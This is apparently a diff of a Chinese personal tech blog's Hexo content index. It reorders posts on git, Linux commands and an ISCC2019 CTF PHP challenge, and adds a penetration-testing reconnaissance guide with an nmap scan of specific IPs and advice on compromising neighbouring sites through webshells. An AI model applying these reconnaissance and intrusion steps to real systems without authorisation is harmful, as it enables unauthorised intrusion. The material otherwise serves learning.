-<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
-]]></content>
-      <categories>
-        <category>Github</category>
-      </categories>
-      <tags>
-        <tag>Github</tag>
       </tags>
   </entry>
   <entry>
@@ -864,6 +864,23 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC2019-Web</title>
+    <url>/posts/25084.html</url>
+    <content><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;flag.php&#39;;</span><br><span class="line">$value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$username &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .&#x3D; chr($value[$i]);</span><br><span class="line">    if ($username &#x3D;&#x3D; &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要传入两个变量<code>value</code>和<code>password</code>.</p>
+<p>count():返回数组中元素的数目<br>unset():销毁指定的变量<br>chr():返回相对应于 ascii 所指定的单个字符<br>.= : 拼接字符串<br>intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP消息头</title>
     <url>/posts/35270.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTTP消息头是指，在超文本传输协议（ Hypertext Transfer Protocol ，HTTP）的请求和响应消息中，协议头部分的那些组件。HTTP消息头用来准确描述正在获取的资源、服务器或者客户端的行为，定义了HTTP事务中的具体操作参数。</p>
@@ -898,23 +915,6 @@
       <tags>
         <tag>web</tag>
         <tag>HTTP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ISCC2019-Web</title>
-    <url>/posts/25084.html</url>
-    <content><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#39;flag.php&#39;;</span><br><span class="line">$value &#x3D; $_GET[&#39;value&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$username &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">for ($i &#x3D; 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">    else $username .&#x3D; chr($value[$i]);</span><br><span class="line">    if ($username &#x3D;&#x3D; &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) &#123;</span><br><span class="line">        echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL;</span><br><span class="line">        echo $flag, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>需要传入两个变量<code>value</code>和<code>password</code>.</p>
-<p>count():返回数组中元素的数目<br>unset():销毁指定的变量<br>chr():返回相对应于 ascii 所指定的单个字符<br>.= : 拼接字符串<br>intval():通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -980,6 +980,40 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux入门学习</title>
+    <url>/posts/18536.html</url>
+    <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
+<a id="more"></a> 
+<p><img src="https://i.imgur.com/fM5coUs.png" alt><br>一个完整的指令的标准格式：Linux通用的格式</p>
+<p><strong>指令主体（空格） [选项]（空格） [操作对象]</strong></p>
+<p>一个指令可以包含多个选项操作对象也可以是多个。</p>
+<p>例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。</p>
+<h2 id="基础指令（重点）"><a href="#基础指令（重点）" class="headerlink" title="基础指令（重点）"></a>基础指令（重点）</h2><p><strong>1、ls指令</strong><br>含义：ls （list）<br><strong>用法1</strong>：<br><code>#ls</code><br>含义：列出当前工作目录下的所有文件/文件夹的名称<br><img src="https://i.imgur.com/MNMiZm6.png" alt><br><strong>用法2</strong>：<br><code>#ls 路径</code><br>含义：列出指定路径下的所有文件/文件夹的名称<br><strong>关于路径</strong>（重要）：<br>路径可以分为两种：相对路径、绝对路径。<br>相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；<br>相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。<br>绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；<br><img src="https://i.imgur.com/cVXsgTA.png" alt><br>用法3：#ls 选项 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。<br>常见的语法：<br>    #ls -l 路径<br>    #ls -la 路径<br>选项解释：<br>    -l：表示list，表示以详细列表的形式进行展示<br>    -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）<br><img src="https://i.imgur.com/nFBEltY.png" alt><br>上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。<br><img src="https://i.imgur.com/IZH0Y2T.png" alt><br>在Linux中隐藏文档一般都是以“.”开头。<br><strong>用法4</strong>：#ls -lh 路径<br>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示<br>参数含义：<br><img src="https://i.imgur.com/U0HadBJ.png" alt><br><strong>2、pwd指令</strong><br>用法：#pwd （print working directory，打印当前工作目录）<br><img src="https://i.imgur.com/WJD7plQ.png" alt><br><strong>3、cd指令</strong><br>命令：#cd        （change directory，改变目录）<br>作用：用于切换当前的工作目录的<br>语法：#cd 路径</p>
+<p>案例：当前在“/”下，需要使用绝对路径切换到/usr/local。<br><img src="https://i.imgur.com/d9G4f1z.png" alt></p>
+<p>案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。<br><img src="https://i.imgur.com/9037q6Y.png" alt><br>补充：<br>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。<br>切换的方式：#cd ~<br><img src="https://i.imgur.com/hUPzXml.png" alt><br><strong>4、mkdir指令</strong><br>指令：mkdir    （make directory，创建目录）<br>语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】</p>
+<p>案例：在当前路径下创建出目录“yunweihenniux”<br><img src="https://i.imgur.com/0SemL16.png" alt><br>注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 </p>
+<p>案例：在指定路径下创建出一个文件夹“yunweihenniux”<br><img src="https://i.imgur.com/tdL2awL.png" alt>   </p>
+<p>语法2：#mkdir -p 路径<br>含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错<br><img src="https://i.imgur.com/fzvNnfY.png" alt> </p>
+<p>语法3：#mkdir 路径1 路径2 路径3 ….  【表示一次性创建多个目录】<br><img src="https://i.imgur.com/12MjF4A.png" alt>   </p>
+<p><strong>5、touch指令</strong><br>令：touch<br>作用：创建文件<br>语法：#touch 文件路径    【路径可以是直接的文件名也可以是路径】 </p>
+<p>案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt<br><img src="https://i.imgur.com/2cVdBLZ.png" alt><br>案例：使用touch来同时创建多个文件<br> <img src="https://i.imgur.com/udw4JAh.png" alt><br>案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt<br><img src="https://i.imgur.com/EA9vj21.png" alt>   </p>
+<p><strong>6、cp指令</strong><br>指令：cp        （copy，复制）<br>作用：复制文件/文件夹到指定的位置<br>语法：#cp 被复制的文档路径 文档被复制到的路径</p>
+<p>案例：使用cp命令来复制一个文件<br><img src="https://i.imgur.com/v0Lvl89.png" alt><br>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</p>
+<p>案例：使用cp命令来复制一个文件夹<br>注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略<br><img src="https://i.imgur.com/dA2SgW8.png" alt>   </p>
+<p><strong>7、mv指令</strong><br>指令：mv   （move，移动，剪切）<br>作用：移动文档到新的位置<br>语法：#mv 需要移动的文档路径 需要保存的位置路径</p>
+<p>确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的</p>
+<p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
+<p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
+<p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux基础命令</title>
     <url>/posts/60189.html</url>
     <content><![CDATA[<p>文件操作命令：</p>
@@ -1031,40 +1065,6 @@
 <p>passwd 用户名   //设置密码</p>
 <p>userdel -r 用户名      //删除用户及用户主目录</p>
 <p>修改用户：usermod -1 用户1，用户2    //修改用户1位用户2</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux入门学习</title>
-    <url>/posts/18536.html</url>
-    <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
-<a id="more"></a> 
-<p><img src="https://i.imgur.com/fM5coUs.png" alt><br>一个完整的指令的标准格式：Linux通用的格式</p>
-<p><strong>指令主体（空格） [选项]（空格） [操作对象]</strong></p>
-<p>一个指令可以包含多个选项操作对象也可以是多个。</p>
-<p>例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。</p>
-<h2 id="基础指令（重点）"><a href="#基础指令（重点）" class="headerlink" title="基础指令（重点）"></a>基础指令（重点）</h2><p><strong>1、ls指令</strong><br>含义：ls （list）<br><strong>用法1</strong>：<br><code>#ls</code><br>含义：列出当前工作目录下的所有文件/文件夹的名称<br><img src="https://i.imgur.com/MNMiZm6.png" alt><br><strong>用法2</strong>：<br><code>#ls 路径</code><br>含义：列出指定路径下的所有文件/文件夹的名称<br><strong>关于路径</strong>（重要）：<br>路径可以分为两种：相对路径、绝对路径。<br>相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；<br>相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。<br>绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；<br><img src="https://i.imgur.com/cVXsgTA.png" alt><br>用法3：#ls 选项 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。<br>常见的语法：<br>    #ls -l 路径<br>    #ls -la 路径<br>选项解释：<br>    -l：表示list，表示以详细列表的形式进行展示<br>    -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）<br><img src="https://i.imgur.com/nFBEltY.png" alt><br>上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。<br><img src="https://i.imgur.com/IZH0Y2T.png" alt><br>在Linux中隐藏文档一般都是以“.”开头。<br><strong>用法4</strong>：#ls -lh 路径<br>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示<br>参数含义：<br><img src="https://i.imgur.com/U0HadBJ.png" alt><br><strong>2、pwd指令</strong><br>用法：#pwd （print working directory，打印当前工作目录）<br><img src="https://i.imgur.com/WJD7plQ.png" alt><br><strong>3、cd指令</strong><br>命令：#cd        （change directory，改变目录）<br>作用：用于切换当前的工作目录的<br>语法：#cd 路径</p>
-<p>案例：当前在“/”下，需要使用绝对路径切换到/usr/local。<br><img src="https://i.imgur.com/d9G4f1z.png" alt></p>
-<p>案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。<br><img src="https://i.imgur.com/9037q6Y.png" alt><br>补充：<br>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。<br>切换的方式：#cd ~<br><img src="https://i.imgur.com/hUPzXml.png" alt><br><strong>4、mkdir指令</strong><br>指令：mkdir    （make directory，创建目录）<br>语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】</p>
-<p>案例：在当前路径下创建出目录“yunweihenniux”<br><img src="https://i.imgur.com/0SemL16.png" alt><br>注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 </p>
-<p>案例：在指定路径下创建出一个文件夹“yunweihenniux”<br><img src="https://i.imgur.com/tdL2awL.png" alt>   </p>
-<p>语法2：#mkdir -p 路径<br>含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错<br><img src="https://i.imgur.com/fzvNnfY.png" alt> </p>
-<p>语法3：#mkdir 路径1 路径2 路径3 ….  【表示一次性创建多个目录】<br><img src="https://i.imgur.com/12MjF4A.png" alt>   </p>
-<p><strong>5、touch指令</strong><br>令：touch<br>作用：创建文件<br>语法：#touch 文件路径    【路径可以是直接的文件名也可以是路径】 </p>
-<p>案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt<br><img src="https://i.imgur.com/2cVdBLZ.png" alt><br>案例：使用touch来同时创建多个文件<br> <img src="https://i.imgur.com/udw4JAh.png" alt><br>案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt<br><img src="https://i.imgur.com/EA9vj21.png" alt>   </p>
-<p><strong>6、cp指令</strong><br>指令：cp        （copy，复制）<br>作用：复制文件/文件夹到指定的位置<br>语法：#cp 被复制的文档路径 文档被复制到的路径</p>
-<p>案例：使用cp命令来复制一个文件<br><img src="https://i.imgur.com/v0Lvl89.png" alt><br>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</p>
-<p>案例：使用cp命令来复制一个文件夹<br>注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略<br><img src="https://i.imgur.com/dA2SgW8.png" alt>   </p>
-<p><strong>7、mv指令</strong><br>指令：mv   （move，移动，剪切）<br>作用：移动文档到新的位置<br>语法：#mv 需要移动的文档路径 需要保存的位置路径</p>
-<p>确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的</p>
-<p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
-<p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
-<p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
 ]]></content>
       <categories>
         <category>Linux</category>
@@ -1223,6 +1223,89 @@
       </tags>
   </entry>
   <entry>
+    <title>Web渗透测试-信息收集总结</title>
+    <url>/posts/44511.html</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>信息收集分为：被动信息收集和主动信息收集。</p>
+<p><strong>被动信息收集</strong><br>不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集。</p>
+<p><strong>主动信息收集</strong><br>和被动信息收集相反，主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。</p>
+<p>没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会相对较少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p>
+<h1 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h1><h2 id="DNS域名信息收集"><a href="#DNS域名信息收集" class="headerlink" title="DNS域名信息收集"></a>DNS域名信息收集</h2><p>我们需要收集域名对应的 ip，域名注册人、DNS记录、子域名等等一系列与域名相关的信息。<br>扫描域名信息的工具由很多，比如：Whois、DIG、Layer、Dnsenum、dnsmap、Fierce、Dmitry、Maltego等等<br>传送门：</p>
+<p><a href="https://blog.csdn.net/qq_36119192/article/details/84068625" target="_blank" rel="noopener">DNS域名探测工具的使用whois、DIG、Layer、dnsenum</a></p>
+<p>在线子域名查询地址：<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p>
+<h2 id="操作系统类型"><a href="#操作系统类型" class="headerlink" title="操作系统类型"></a>操作系统类型</h2><p>服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。</p>
+<ul>
+<li><p>判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。<br><img src="/posts/44511/%E6%94%B6%E9%9B%862.png" alt></p>
+</li>
+<li><p>可以使用nmap的“-O”参数，来初步判断服务器系统类型：<br><img src="/posts/44511/1.png" alt></p>
+</li>
+<li><p>大小写<br>访问网站：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;index.html</span><br><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;inDex.html</span><br></pre></td></tr></table></figure>
+<p>Windows操作系统不区分大小写，Linux系统大小写敏感，用此方法能够判断是Windows还是Linux系统。</p>
+</li>
+</ul>
+<h2 id="网站容器-Apache-Nginx-Tomcat-IIS"><a href="#网站容器-Apache-Nginx-Tomcat-IIS" class="headerlink" title="网站容器(Apache/Nginx/Tomcat/IIS)"></a>网站容器(Apache/Nginx/Tomcat/IIS)</h2><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
+<p>探测网站是哪种web服务器，可以使用工具 whatweb 。</p>
+<p>传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/84061734" target="_blank" rel="noopener">网站指纹识别工具Whatweb的使用</a></p>
+<h2 id="脚本类型-php-jsp-asp-aspx"><a href="#脚本类型-php-jsp-asp-aspx" class="headerlink" title="脚本类型(php/jsp/asp/aspx)"></a>脚本类型(php/jsp/asp/aspx)</h2><p>我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。</p>
+<ul>
+<li><p>可以根据网站URL来判断</p>
+</li>
+<li><p>site:xxx  filetype:php</p>
+</li>
+<li><p>可以根据Firefox的插件来判断</p>
+<p><img src="/posts/44511/%E6%94%B6%E9%9B%863.png" alt></p>
+</li>
+</ul>
+<h2 id="数据库类型-Mysql-Oracle-Accees-Mqlserver"><a href="#数据库类型-Mysql-Oracle-Accees-Mqlserver" class="headerlink" title="数据库类型(Mysql/Oracle/Accees/Mqlserver)"></a>数据库类型(Mysql/Oracle/Accees/Mqlserver)</h2><p>我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的.</p>
+<h2 id="主机扫描-AWVS、Nessus"><a href="#主机扫描-AWVS、Nessus" class="headerlink" title="主机扫描(AWVS、Nessus)"></a>主机扫描(AWVS、Nessus)</h2><p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p>
+<p>传送门：<br><a href="https://l1395851238.github.io/2019/03/20/awvs-de-ji-ben-shi-yong/" target="_blank" rel="noopener">AWVS的基本使用</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82852117" target="_blank" rel="noopener">Nessus扫描器的使用</a></p>
+<h2 id="CMS类型"><a href="#CMS类型" class="headerlink" title="CMS类型"></a>CMS类型</h2><ul>
+<li><p>robots.txt文件</p>
+<p><img src="/posts/44511/2.png" alt></p>
+<p>从wp路径可以看出这个是WordPress的cms</p>
+</li>
+<li><p>通过版权信息进行查询<br>一般直接拉到底部查看版权信息，有些站点会显示出来</p>
+</li>
+<li><p>通过查看网页源码的方式<br><img src="/posts/44511/3.png" alt></p>
+</li>
+</ul>
+<h2 id="旁站和C段扫描"><a href="#旁站和C段扫描" class="headerlink" title="旁站和C段扫描"></a>旁站和C段扫描</h2><p>旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！</p>
+<p>C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。<br>旁站和C段在线查询地址：<br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><a href="http://www.5kik.com/" target="_blank" rel="noopener">http://www.5kik.com/</a></p>
+<ul>
+<li><p>在线查询网站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a><br><img src="/posts/44511/4.png" alt></p>
+</li>
+<li><p>站长之家<br><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">http://tool.chinaz.com/</a><br><img src="/posts/44511/5.png" alt></p>
+</li>
+</ul>
+<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>nmap扫描<br><code>nmap -F -sT -v -n 45.33.49.119-120</code></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>apache漏洞复现</title>
+    <url>/posts/37023.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="0bc9941238671938d5de60a836ad3753b266855f9b77802d9889d63db0ed9932">a3f8bae71a5f3e4552a0d65b81f73c7004610e3358af5df12e14b268bb3fb84c3e6bbe8a70a8626035aa867fd6fbf73b160e3d74e342898eece8c6a648818912f31dc173953cf065634753a1a1cf25b6d69a9ae5a3df13eb7c8d8c88771acabf660bdd6c09d7ef475bee02819fb608d1c1dc9a30ef610d1702012981ad208f2994d944bed3ff78c8d96d36c07997a4cce38640d8a529ecc3999a1cf2f735cceaa2aada3064bc6c879220ac307d0f13498d4d5ac7a0a5dcf6ca02655f044c32372cdfbd11a8fdc09bb9dcf120ddb06abff0642047a03e38575a47db3acbc267866d9a6e96f6815f894b155c4879a1d332ac54605ad240ea1a8f64f5898789eccb0c65dbcad89242c5a92fee29c92b20d12f9c8192a44e6073fb2b3211c47e982518638a176d5e048eb0e59ea6a1bbb58bb9fd55437ed57ea8156a1ebc1205b273515422c8129cb965cd844b25291bc83d6d64a696f7ec29c9e129c2f2094d180f304e18ddf8de02d8b5287719638b1b9976cde1ae1d1b6ca7bb327e577914712c18b7a7763a3a8b1d1fe3b56b2d248a5fdbc7dd0b27271ff63921cdd622b8a942bbbbc966bc5ac87593e2f1c86a55a5cd13a989f1ca3bdcad084482150299b27ecf427a5a82d9fa71933d68aa7fca3b5a098faac849abff0f3a435470cc6fe00e1a4945be3656afd2e494077fff3b78e1c60a3a4abf89a393be0220a10aa480cf042918fc21e3e241720b33130d803f5f501f3b7563d6e8a1fcc6ec429e3f440983ee3e8a3465f40929f08b9e5fc025e6a5552af4146c324dde6cfa6415d1e8fb4b3e3a0c2c9e950c2ae7025c4322335d4131aebd664e3fabaf646fa085507d0a90903ffd20c977a01c7309554f2dbfb0637c9b2e8b68cf0a66b12bc674adcf1bed6929e5c92a6aa5bfa1ed7c1376c7dcb440ceb7a36bf0c133dc0ddcf5b94e6370ce8c65ca8d57962e6ab0501a3b09586c1cb5ea9f2a63ed2324e6b63512e3b008568243a2b769a60844223e4d4b406e77ad03139fc22075a3c6adc7b245f398aa5dd82b651e30e37ca97f5047670540a3f22ce7d5122aa25e640fabd9843ab4feb67715c2e8b77ae9ab1db00eb951253fe9c02260db3c91db55bc85149868c5942c0ffcab206ca686732b841a762683d0f36a52ebef4277b730ecb10a50a10b3cdac3c860bcd89f37e4c62fd658a921cbcf19bfa90fb217f29a3372aa4fe1e1b7e37fd7e73744a2419c480e7cdca298cde670d579d9a2965ac99ba0a84cc0e937257d20ea5798ee2cb24cc3ad8053d8f75a97d316f3806e5e4eb2563d1c6737a45f9aa69515ede57e7b89f1fb59ecedbc3fe741aeefa60b2478a4244579f31444793a28e3232b46f29a8e47c4d9d4e5391dd5ebf381a0dffa505db17d9ce09f8fd6a501301aba6038204405a26e537de1104b2f52268b504505febebdfa2af7dd5fbc522e15eb93fff7758cda994bcc6351d18fb1260fd7b868f5e4f695f08390203aed6d22df75c82917e31978d35dd287760b224fd07fabcf60a5a03af51785c78f233f25f0dafdcee1bb8a64cb2e706bc49e5bb4c0bc63aa0c0f12c6b055a169cb706a0c2037a61968684a68814635a5fc393405fd696037038523a527ceb4c6e796042b0970546aeafaf38a36b11e12bb8832afd4dde90b611e68bf688a20574f7b4004598415d593df075a49a2cea6c2edc2c6d49d70ce446bbc48631bd14cf9748cff36df98395fc7be5e0da9827928ad71e0097387029203bf4307725102a6fa4b10e59809738f1f58b2b59ef1586913748d87b068a1ec7e436db1587c8fec0d816856ffa52cee189858764582c15e346fc801116826fb62f689cae2467bf3276151e22e9e2eddb4fcd9806bc3b4301529718de786e462c80c590f016272a076f71e653a29fa34bfce6b3d389a2db015874513f4d240c6ede18b8e37a4b4ecfc80b0719e97cae495b3038094453d8f540ee318f0a9df3cd080bf903643d1a7507a0bc2b4e283cfb5bc0f7282edc1e699ad064ae238486ed3759